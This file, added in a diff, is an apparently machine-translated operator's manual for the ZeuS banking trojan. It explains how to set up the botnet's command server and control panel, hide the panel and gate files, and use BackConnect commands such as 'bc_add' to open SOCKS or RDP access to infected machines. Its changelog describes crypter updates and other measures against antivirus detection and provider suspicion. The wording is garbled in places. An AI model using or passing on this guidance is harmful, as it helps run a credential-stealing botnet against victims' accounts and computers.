@@ -1,0 +1,380 @@
+User's Guide (Draft) 
+*********************************** 
+
+============== 
+= Contents = 
+============== 
+
+1. Description and features. 
+2. Setting up the server. 
+   2.1. HTTP-server. 
+   2.2. The interpreter PHP. 
+   2.3. MySQL-server. 
+   2.4. Control Panel. 
+     2.4.1. Installation. 
+     2.4.2. Update. 
+     2.4.3. File / system / fsarc.php. 
+3. Setting Bot. 
+4. Working with BackConnect. 
+5. Changelog. 
+6. F.A.Q. 
+7. Myths. 
+
+============================== 
+= 1. Description and features. = 
+============================== 
+ZeuS - software to steal personal user data from remote systems, Windows. On 
+plain language of "trojan", "backdoor", "virus". But the author does not like these words, therefore, further documentation 
+He will call this software "Bot". 
+
+Boat is fully based on the WinAPI Interception in UserMode (Ring3), this means that the bot does not use 
+drivers or treatments in Ring0. This feature makes it possible to run even on 
+Guest Account. Plus, it ensures greater stability and adaptability 
+on next versions of Windows. 
+
+Bot is written in Visual C + + version 9.0 +, with no additional libraries are used 
+(no msvcrt, ATL, MFC, QT, etc. used). Code is written with the following priorities (in descending order): 
+   1. stability (carefully checked all the results of the call functions, etc.) 
+   2. size (to avoid duplication of algorithms, repetitive calls, functions, etc.) 
+   3. speed (not the type of instruction while (1 ){..}, for (int i = 0; i <strlen (str); i ++){..}). 
+
+Functions and features bot: 
+   1. Sniffer traffic for the protocol TCP. 
+      1.1. Interception of FTP logins on any port. 
+      1.2. Interception of POP3 logins on any port. 
+      1.3. The interception of any data from the traffic (a personal request). 
+   
+   2. Intercepting HTTP / HTTPS requests to wininet.dll, ie all programs working with this 
+      library. This includes Internet Explorer (any version), Maxton, etc. 
+      2.1. Substitution .. 
+      
+   3. The functions of the server. 
+      3.1 Socks4/4a/5. 
+      3.2 Backconnect for any services (RDP, Socks, FTP, etc.) on the infected machine. You can 
+          access to a computer that is behind a NAT, or, for example, that 
+          banned from the internet connection. 
+      3.3 Getting a screenshot of your screen in real time. 
+- other not leasted features --- 
+
+========================= 
+= 2. Setting up the server. = 
+========================= 
+The server is the central point of botnet's control, it get reports from bots 
+and sends commands. It is not recommended to use the "Virtual Hosting" or "VDS", because 
+with large botnet, the load on the server will increase, and this type of hosting is quite 
+quickly exhausted their resources. You need a "Dedicated Server" (DS), the recommended minimum 
+configuration: 
+
+1. 2GB of RAM. 
+2. 2x CPU frequency 2 GHz, 
+3. SATA hard drive 7200rpm + 
+
+Bot requires HTTP-server with PHP + Zend Optimizer, and MySQL-server. 
+
+NOTE: For Windows-systems is very important to edit (create) the following registry value: 
+HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Services \ Tcpip \ Parameters \ MaxUserPort = dword: 65534 
+(decimal) 
+
+--------------------- 
+- 2.1. HTTP-server. -- 
+--------------------- 
+As an HTTP-server is recommended to use: for nix-systems - Apache version 2.2+, for 
+Windows-systems - IIS version 6.0+. We recommend that you keep the HTTP-server on port 80 or 443 (this 
+positive effect on bots number, as providers / proxy can block access to other 
+non-standard ports). 
+
+Download Apache: http://apache.org/dyn/closer.cgi 
+or IIS: http://www.iis.net/ 
+
+--------------------------- 
+- 2.2. The interpreter PHP. -- 
+--------------------------- 
+The latest version of the control panel designed for PHP 5.2.6. It is highly recommended 
+use the version is not lower than this version. But in extreme cases of not less than 5.2. 
+
+It is important to make the following settings in php.ini: 
+
+safe_mode = Off 
+magic_quotes_gpc = Off 
+magic_quotes_runtime = Off 
+memory_limit = 256M; or higher. 
+post_max_size = 100M; or higher. 
+
+and recommended to change the following settings: 
+
+display_errors = Off 
+
+Also need to add Zend Optimizer (acceleration of the script, and run the protected 
+scripts). We recommend version 3.3. 
+
+We do not recommend to use PHP as HTTP-CGI. 
+
+Download PHP: http://www.php.net/downloads.php 
+Download Zend Optimizer: http://www.zend.com/en/products/guard/downloads 
+
+---------------------- 
+- 2.3. MySQL-server. -- 
+---------------------- 
+MySQL is required to store all data on botnet. The recommended version is not lower than 5.1.30, as well 
+worth considering that when the control panel in the older versions have some 
+problem. All table control panel, go to a MyISAM, it is important to optimize 
+speed of work with this format, on the basis of the available server resources. 
+
+We recommend the following changes to the MySQL-server setup (my or my.ini): 
+
+max_connections = 2000 # Or higher 
+
+Download MySQL: http://dev.mysql.com/downloads/ 
+
+--------------------------- 
+- 2.4. Control Panel. -- 
+--------------------------- 
+
+2.4.1. Setting. 
+***************** 
+Appointment of files and folders: 
+/ install - the installer. 
+/ system - the system files. 
+/ system / fsarc.php - a script to call an external archiver (section 2.4.3). 
+/ system / config.php - config file. 
+/ theme - the theme file (design), without Zend can freely change. 
+cp.php - control panel. 
+gate.php - gate for bots. 
+index.php - empty file to prevent listing of files. 
+
+The control panel is usually located in your folder in the distribution server [php]. All contents of this 
+folder, you need to upload to the server in any directory accessible by HTTP. If you download it through 
+FTP, all files you download in binary mode. 
+
+To nix-systems exhibit the right: 
+. - 777 
+/ system - 777 
+/ tmp - 777 
+
+For Windows-systems: 
+\ system - the right to full write, read only for users of the under which the access 
+           via HTTP. For IIS this is usually IUSR_ *. 
+\ tmp - as well as for the \ system. 
+
+Once all files are downloaded, you need a web browser to run the installer on the URL 
+http://server/zeus_folder/install/index.php. Follow the instructions appeared, in the case of 
+mistakes (you will be notified in detail) in the installation, check that all fields are correct, 
+and correct installation of the rights to the folder. 
+
+After installation, we recommend that you delete the directory install, and rename files cp.php (entrance to the 
+panel) and gate.php (gate for bots) in any files you want (don't change the extension). 
+
+Now you can safely enter into the control panel by typing in the browser URL renamed 
+File cp.php. 
+
+2.4.2. Update. 
+****************** 
+If you have a new copy of the control panel, and want to update an older version, the 
+should do the following: 
+
+1) Copy the files a new panel in place of old ones. 
+2) Rename files cp.php and gate.php under their real names of your choice during installation 
+    the old control panel. 
+3) In any case, the right to re-set the directory in accordance with paragraph 2.4. 
+4) with a browser to run the installer for URL http://server/direktoriya/install/index.php, and 
+    appeared to follow the instructions. The process of the installer may take a fairly large 
+    period of time, this is due to the fact that some tables may be re-records. 
+5) You can use the new control panel. 
+
+2.4.3. File / system / fsarc.php. 
+****************************** 
+This file contains a function to call an external archiver. At this time, archive 
+used only in "Reports:: Search in files" (reports_files), and is called to load 
+Files and folders in a single archive. By default, set to Zip archive, and is 
+universal for Windows and nix, so all you have to do is to install the system this 
+archive, and to the right in its execution. You can also edit this file to work with 
+any archiver. 
+
+Download Zip: http://www.info-zip.org/Zip.html. 
+
+====================== 
+= 3. Settings.       = 
+====================== 
+
+=========================== 
+= 4. Working with BackConnect = 
+=========================== 
+Working with BackConnect regarded as an example. 
+
+IP of BackConnect-server: 192.168.100.1 
+Port for the bot: 4500 
+Port for the client application: 1080 
+
+1) Run the server application (zsbcs.exe or zsbcs64.exe) on the server has an IP in 
+    Internet application specifies the port, which is expected to connect from the bot, and the port to 
+    which will connect the client application. For example zsbcs.exe listen-cp: 1080-bp: 4500, 
+    where 1080 - the client port 4500 - port to the bot. 
+
+2) Required command (bc_add service server_host server_port) will be sended to bot, where the service -- 
+    port number or name * service, which needs to connect to the Bot. 
+    
+    * currently only supported in the name of socks, which allows you to connect to the built-in 
+    Socks-bot server. 
+
+    server_host - a server that zapusheno server application. It can be used IPv4, 
+                  IPv6, or domain. 
+    server_port - a port that is specified in the option cp server application. In this case, 4500. 
+
+    Example: bc_add socks 192.168.100.1 4500 - as a result you get the socks, 
+            bc_add 3389 192.168.100.1 4500 - as a result you get rdp. 
+
+3) Now you need to wait for bot to connect to the server, in this period, any attempt to client 
+    applications to connect will be ignored (will disconnect the client). When bot 
+    connects, in server's console will be output line: "Accepted new conection from bot ...". 
+
+4) After connecting the bot, you can work with their client. Ie you just 
+    connect to the server to the client port (in this case 1080). For example, if you gave 
+    command "socks", a port on the client you will be expected to Socks-server, if port 3389, then 
+    you connect to 192.168.100:1080 as a normal RDP. 
+
+5) After that, when you do not need BackConnect of the bot for a certain service, you must pay 
+    click bc_del service server_host server_port, where all the parameters must be identical 
+    parameters bc_add, which must be removed. You can also use the spec. characters 
+    '*' And '?'. 
+
+    For example: bc_del * * * - deletes all BackConnects from this bot. 
+              bc_del * 192.168 .* * remove all backconnects, connect to the server with IP 192.168 .*. 
+              bc_del 3389 192.168.100.1 4500 - specifically removes one backconnect. 
+
+NOTES: 
+1) You can specify any number of backconnects (ie bc_add), but they should not be shared 
+    combination of IP + Port. But if there is such a combination, will be launched first added. 
+2) For each backconnect, you must run a separate server application. 
+3) if the connection (drop server drop bot, etc.), bot will repeat the connection 
+    to the server indefinitely (even after rebooting the PC), until backconnect will not be removed 
+    (ie bc_del). 
+4) As a service to bc_add, you can use any open port at the address 127.0.0.1. 
+5) The server application supports IPv6, but in principle at the present time, this support is not particularly 
+    relevant. 
+6) You can launch the server application under wine. Writing the same elf application is currently not 
+    planned. 
+7) It is recommended to use the option bp popular application server ports (80, 8080, 
+    443, etc.), because other ports may be blocked by the provider of bot. 
+8) should not be allowed to connect to different bots on the same server port at the same time. 
+9) The method of such a connection might be useful for bots, which are outside the NAT, because sometimes 
+    Windows firewall or ISP may be blocked from the Internet connection. 
+
+NOTE: This feature is not available in all builds Bot. 
+
+====================== 
+= 5. History. = 
+====================== 
+Conditional tags: 
+   [*] - Change. 
+   [-] - Fix. 
+   [+] - New feature. 
+
+[Version 1.2.0.0, 20.12.2008] 
+   Overall: 
+     [*] Documentation in txt format. chm not used anymore. 
+     [+] Now the bot is able to receive commands not only with the sending status, but when sending 
+         files / logs. 
+     [+] Local data requests to the server and the configuration file is encrypted with RC4 (you can specify your key). 
+     [*] Fully updated protocol bot <-> server. Perhaps less load on the server. 
+   
+   Boat: 
+     [-] Fixed the bug that blocking bots on limited account. 
+     [*] Written a new PE-crypter. Now PE-file is very accurate and the most 
+         simulates the results of the MS Linker 9.0. 
+     [*] Updated build process in bilder. 
+     [*] Optimized compression of the configuration file. 
+     [*] The new format is a binary configuration file. 
+     [*] Rewritten the process of assembling the binary config file. 
+     [*] Socks and LC are now working on a port. 
+   
+   Control Panel: 
+     [*] The status of the control panel is BETA. 
+     [*] Changed all MySQL tables. 
+     [*] Control Panel moving on UTF-8 charset (may be temporary problems with 
+         displaying characters). 
+     [*] Updated geobase. 
+
+[Version 1.2.1.0, 30.12.2008] 
+   Boat: 
+     [*] BOFA Answers are now sent as BLT_GRABBED_HTTP (was BLT_HTTPS_REQUEST). 
+     [-] Small error when sending reports. 
+     [-] The size of the report could not exceed ~ 550 characters. 
+     [-] A low timeout for sending POST-requests 
+         resulting in a blocked sending long (more than ~ 1 Mb) Report on slow 
+         compounds (not stable), as the theoretical implications - bot altogether stopped sending 
+         logs. 
+   
+   Overall: 
+     [+] In the case record and record type BLT_HTTP_REQUEST BLT_HTTPS_REQUEST field SBCID_PATH_SOURCE 
+         (in the table will path_source) added path URL. 
+   
+   Control Panel: 
+     [*] Updated redir.php. 
+
+[Version 1.2.2.0, 11.03.2009] 
+   Boat: 
+     [-] Fixed bug in HTTP-injections exists for all versions of bot. When 
+         use in the asynchronous mode wininet.dll, was lost time 
+         synchronize flows generated wininet.dll, with the result that, under certain conditions 
+         been an exception. 
+     [+] By an HTTP-injection now also change the files in the local cache. 
+         The absence of this refinement can not always activate HTTP-injection. 
+     [+] Reduce the size of PE-file. 
+
+[Version 1.2.3.0, 28.03.2009] 
+   Boat: 
+     [-] Minor bug in crypter, thanks to Avira. 
+
+   Overall: 
+     [*] Changed protocol of bot's commands. 
+   
+   Control Panel: 
+     [*] Completely rewritten Control Panel. 
+     [*] Design rewritten to XHTML 1.0 Strict (for IE does not work). 
+     [*] Bot is now again able to receive commands only when sending a report on the online status 
+         (too high load). 
+     [*] Updated geobase. 
+
+[Version 1.2.4.0, 02.04.2009] 
+   Boat: 
+     [+] When using HTTP, the header User-Agent is now read by Internet Explorer, rather than 
+         is a constant as before. Theoretically, because of the constant User-Agent'a, queries 
+         providers may be blocked or fall under suspicion. 
+
+   Control Panel: 
+     [-] Fixed a bug displaying records containing characters 0-31 and 127-159. 
+
+============= 
+= 6. F.A.Q. = 
+============= 
+Q: What's the version numbers mean? 
+A: a.b.c.d 
+     a - a complete change in your bot. 
+     b - the major changes that cause complete or partial incompatibility with previous 
+         versions. 
+     c - correct errors, refine, add features. 
+     d - the number of reFUDs for the current version 
+
+Q: How does the generated Bot ID? 
+A: Bot ID consists of two parts:% name% _% number%, where the name - the name of the computer (the result of 
+    GetComputerName), a number - a certain number that is generated on the basis of some unique operating system data. 
+
+Q: Why is the traffic is encrypted using symmetric encryption (RC4), but not asymmetric (RSA)? 
+A: Because the use of complex algorithms does not make sense, you need to encrypt only to hide 
+    traffic. Plus RSA only in terms of not knowing the key is in the Control Panel will not 
+    ability to emulate her answers. And what meaning is to defend this (globally 
+    view)? 
+
+Q: I damaged tables / files panel, what should I do? 
+A: Play the instructions specified in paragraph 2.5. 
+
+=========== 
+7. Myths = 
+=========== 
+M: ZeuS uses a DLL. 
+A: False. There is only one executable PE file (exe). Dll, sys, etc. not used.
+   This myth has gone due to the fact that in some version for bot 
+    storage configuration used for files with such extensions. 
+    
+M: ZeuS uses COM (BHO) for the interception of Internet Explorer. 
+A: False. Used WinAPI interception of wininet.dll.
